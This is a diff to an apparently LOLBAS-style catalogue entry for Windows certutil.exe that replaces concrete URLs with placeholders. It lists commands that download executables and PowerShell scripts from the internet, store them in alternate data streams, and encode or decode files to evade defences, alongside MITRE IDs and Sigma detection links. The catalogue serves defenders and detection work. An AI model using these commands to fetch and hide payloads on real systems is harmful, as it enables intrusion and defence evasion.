@@ -1,46 +1,46 @@
 ---
 Name: Certutil.exe
 Description: Windows binary used for handling certificates
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
-    Description: Download and save 7zip to disk in the current folder.
+  - Command: certutil.exe -urlcache -split -f {REMOTEURL:.exe} {PATH:.exe}
+    Description: Download and save executable to disk in the current folder.
     Usecase: Download file from Internet
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
-    Description: Download and save 7zip to disk in the current folder.
+  - Command: certutil.exe -verifyctl -f -split {REMOTEURL:.exe} {PATH:.exe}
+    Description: Download and save executable to disk in the current folder.
     Usecase: Download file from Internet
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+  - Command: certutil.exe -urlcache -split -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
     Description: Download and save a PS1 file to an Alternate Data Stream (ADS).
     Usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
     Category: ADS
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: certutil -encode inputFileName encodedOutputFileName
+  - Command: certutil -encode {PATH} {PATH:.base64}
     Description: Command to encode a file using Base64
     Usecase: Encode files to evade defensive measures
     Category: Encode
     Privileges: User
     MitreID: T1027.013
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: certutil -decode encodedInputFileName decodedOutputFileName
+  - Command: certutil -decode {PATH:.base64} {PATH}
     Description: Command to decode a Base64 encoded file.
     Usecase: Decode files to evade defensive measures
     Category: Decode
     Privileges: User
     MitreID: T1140
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: certutil -decodehex encoded_hexadecimal_InputFileName decodedOutputFileName
-    Description: Command to decode a hexadecimal-encoded file decodedOutputFileName
+  - Command: certutil -decodehex {PATH:.hex} {PATH}
+    Description: Command to decode a hexadecimal-encoded file.
     Usecase: Decode files to evade defensive measures
     Category: Decode
     Privileges: User
@@ -49,8 +49,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\certutil.exe
   - Path: C:\Windows\SysWOW64\certutil.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
